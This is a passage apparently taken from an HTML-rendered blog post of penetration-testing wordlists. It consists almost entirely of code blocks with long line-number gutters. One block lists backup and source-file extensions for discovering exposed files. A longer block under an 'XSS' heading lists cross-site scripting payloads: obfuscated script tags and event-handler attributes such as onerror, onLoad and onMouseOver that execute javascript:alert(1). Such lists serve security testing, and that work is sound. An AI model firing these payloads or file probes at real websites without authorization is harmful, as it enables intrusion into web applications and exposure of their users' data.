class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">001</span><br><span class="line">002</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">7z</span><br><span class="line">Z</span><br><span class="line">back</span><br><span class="line">backup</span><br><span class="line">bak</span><br><span class="line">bakup</span><br><span class="line">bas</span><br><span class="line">bz2</span><br><span class="line">c</span><br><span class="line">conf</span><br><span class="line">copia</span><br><span class="line">core</span><br><span class="line">cpp</span><br><span class="line">dat</span><br><span class="line">db</span><br><span class="line">default</span><br><span class="line">dll</span><br><span class="line">doc</span><br><span class="line">ini</span><br><span class="line">jar</span><br><span class="line">java</span><br><span class="line">old</span><br><span class="line">orig</span><br><span class="line">pas</span><br><span class="line">rar</span><br><span class="line">sav</span><br><span class="line">saved</span><br><span class="line">source</span><br><span class="line">src</span><br><span class="line">stackdump</span><br><span class="line">tar</span><br><span class="line">targz</span><br><span class="line">temp</span><br><span class="line">test</span><br><span class="line">tgz</span><br><span class="line">tmp</span><br><span class="line">txt</span><br><span class="line">war</span><br><span class="line">zip</span><br><span class="line">~</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">php</span><br><span class="line">php3</span><br><span class="line">php4</span><br><span class="line">php5</span><br><span class="line">txt</span><br><span class="line">shtm</span><br><span class="line">shtml</span><br><span class="line">phtm</span><br><span class="line">phtml</span><br><span class="line">jhtml</span><br><span class="line">pl</span><br><span class="line">jsp</span><br><span class="line">cfm</span><br><span class="line">cfml</span><br><span class="line">py</span><br><span class="line">rb</span><br><span class="line">cfg</span><br><span class="line">zip</span><br><span class="line">pdf</span><br><span class="line">gz</span><br><span class="line">tar</span><br><span class="line">tar.gz</span><br><span class="line">tgz</span><br><span class="line">doc</span><br><span class="line">docx</span><br><span class="line">xls</span><br><span class="line">xlsx</span><br><span class="line">conf</span><br><span class="line">7z</span><br><span class="line">asmx</span><br><span class="line">asp</span><br><span class="line">aspx</span><br><span class="line">bak</span><br><span class="line">bat</span><br><span class="line">bin</span><br><span class="line">bz2</span><br><span class="line">c</span><br><span class="line">cc</span><br><span class="line">cfg</span><br><span class="line">cfm</span><br><span class="line">cgi</span><br><span class="line">class</span><br><span class="line">cnf</span><br><span class="line">conf</span><br><span class="line">config</span><br><span class="line">cpp</span><br><span class="line">cs</span><br><span class="line">csv</span><br><span class="line">dat</span><br><span class="line">db</span><br><span class="line">dll</span><br><span class="line">do</span><br><span class="line">doc</span><br><span class="line">dump</span><br><span class="line">ep</span><br><span class="line">err</span><br><span class="line">error</span><br><span class="line">exe</span><br><span class="line">gif</span><br><span class="line">gz</span><br><span class="line">htm</span><br><span class="line">html</span><br><span class="line">inc</span><br><span class="line">ini</span><br><span class="line">java</span><br><span class="line">jhtml</span><br><span class="line">jpg</span><br><span class="line">js</span><br><span class="line">jsf</span><br><span class="line">jsp</span><br><span class="line">key</span><br><span class="line">lib</span><br><span class="line">log</span><br><span class="line">lst</span><br><span class="line">manifest</span><br><span class="line">mdb</span><br><span class="line">meta</span><br><span class="line">msg</span><br><span class="line">nsf</span><br><span class="line">o</span><br><span class="line">old</span><br><span class="line">ora</span><br><span class="line">orig</span><br><span class="line">out</span><br><span class="line">part</span><br><span class="line">pdf</span><br><span class="line">php</span><br><span class="line">php3</span><br><span class="line">phtml</span><br><span class="line">pl</span><br><span class="line">pm</span><br><span class="line">png</span><br><span class="line">ppt</span><br><span class="line">properties</span><br><span class="line">py</span><br><span class="line">rar</span><br><span class="line">rss</span><br><span class="line">rtf</span><br><span class="line">save</span><br><span class="line">sh</span><br><span class="line">shtml</span><br><span class="line">svg</span><br><span class="line">so</span><br><span class="line">sql</span><br><span class="line">stackdump</span><br><span class="line">swf</span><br><span class="line">tar</span><br><span class="line">tar.bz2</span><br><span class="line">tar.gz</span><br><span class="line">temp</span><br><span class="line">test</span><br><span class="line">tgz</span><br><span class="line">tmp</span><br><span class="line">trace</span><br><span class="line">txt</span><br><span class="line">vb</span><br><span class="line">vbs</span><br><span class="line">ws</span><br><span class="line">xls</span><br><span class="line">xml</span><br><span class="line">xsl</span><br><span class="line">zip</span><br></pre></td></tr></table></figure><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a><font color="green">XSS</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br></pre></td><td class="code"><pre><span class="line">&lt;script\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x09type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&lt;script\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;</span><br><span class="line">&apos;`&quot;&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;        </span><br><span class="line">&apos;`&quot;&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/img&gt;</span><br><span class="line">&lt;audio src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/audio&gt;</span><br><span class="line">&lt;video src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/video&gt;</span><br><span class="line">&lt;body src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/body&gt;</span><br><span class="line">&lt;image src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/image&gt;</span><br><span class="line">&lt;object src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/object&gt;</span><br><span class="line">&lt;script src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;svg onResize svg onResize=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onResize&gt;</span><br><span class="line">&lt;title onPropertyChange title onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/title onPropertyChange&gt;</span><br><span class="line">&lt;iframe onLoad iframe onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onLoad&gt;</span><br><span class="line">&lt;body onMouseEnter body onMouseEnter=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseEnter&gt;</span><br><span class="line">&lt;body onFocus body onFocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onFocus&gt;</span><br><span class="line">&lt;frameset onScroll frameset onScroll=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onScroll&gt;</span><br><span class="line">&lt;script onReadyStateChange script onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/script onReadyStateChange&gt;</span><br><span class="line">&lt;html onMouseUp html onMouseUp=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseUp&gt;</span><br><span class="line">&lt;body onPropertyChange body onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPropertyChange&gt;</span><br><span class="line">&lt;svg onLoad svg onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onLoad&gt;</span><br><span class="line">&lt;body onPageHide body onPageHide=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPageHide&gt;</span><br><span class="line">&lt;body onMouseOver body onMouseOver=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseOver&gt;</span><br><span class="line">&lt;body onUnload body onUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onUnload&gt;</span><br><span class="line">&lt;body onLoad body onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onLoad&gt;</span><br><span class="line">&lt;bgsound onPropertyChange bgsound onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/bgsound onPropertyChange&gt;</span><br><span class="line">&lt;html onMouseLeave html onMouseLeave=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseLeave&gt;</span><br><span class="line">&lt;html onMouseWheel html onMouseWheel=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseWheel&gt;</span><br><span class="line">&lt;style onLoad style onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/style onLoad&gt;</span><br><span class="line">&lt;iframe onReadyStateChange iframe onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onReadyStateChange&gt;</span><br><span class="line">&lt;body onPageShow body onPageShow=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPageShow&gt;</span><br><span class="line">&lt;style onReadyStateChange style onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/style onReadyStateChange&gt;</span><br><span class="line">&lt;frameset onFocus frameset onFocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onFocus&gt;</span><br><span class="line">&lt;applet onError applet onError=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onError&gt;</span><br><span class="line">&lt;marquee onStart marquee onStart=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onStart&gt;</span><br><span class="line">&lt;script onLoad script onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/script onLoad&gt;</span><br><span class="line">&lt;html onMouseOver html onMouseOver=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseOver&gt;</span><br><span class="line">&lt;html onMouseEnter html onMouseEnter=&quot;javascript:parent.javascript:alert(1)&quot;&gt;&lt;/html onMouseEnter&gt;</span><br><span class="line">&lt;body onBeforeUnload body onBeforeUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onBeforeUnload&gt;</span><br><span class="line">&lt;html onMouseDown html onMouseDown=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseDown&gt;</span><br><span class="line">&lt;marquee onScroll marquee onScroll=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onScroll&gt;</span><br><span class="line">&lt;xml onPropertyChange xml onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/xml onPropertyChange&gt;</span><br><span class="line">&lt;frameset onBlur frameset onBlur=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onBlur&gt;</span><br><span class="line">&lt;applet onReadyStateChange applet onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onReadyStateChange&gt;</span><br><span class="line">&lt;svg onUnload svg onUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onUnload&gt;</span><br><span class="line">&lt;html onMouseOut html onMouseOut=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseOut&gt;</span><br><span class="line">&lt;body onMouseMove body onMouseMove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseMove&gt;</span><br><span class="line">&lt;body onResize body onResize=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onResize&gt;</span><br><span class="line">&lt;object onError object onError=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/object onError&gt;</span><br><span class="line">&lt;body onPopState body onPopState=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPopState&gt;</span><br><span class="line">&lt;html onMouseMove html onMouseMove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseMove&gt;</span><br><span class="line">&lt;applet onreadystatechange applet onreadystatechange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onreadystatechange&gt;</span><br><span class="line">&lt;body onpagehide body onpagehide=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onpagehide&gt;</span><br><span class="line">&lt;svg onunload svg onunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onunload&gt;</span><br><span class="line">&lt;applet onerror applet 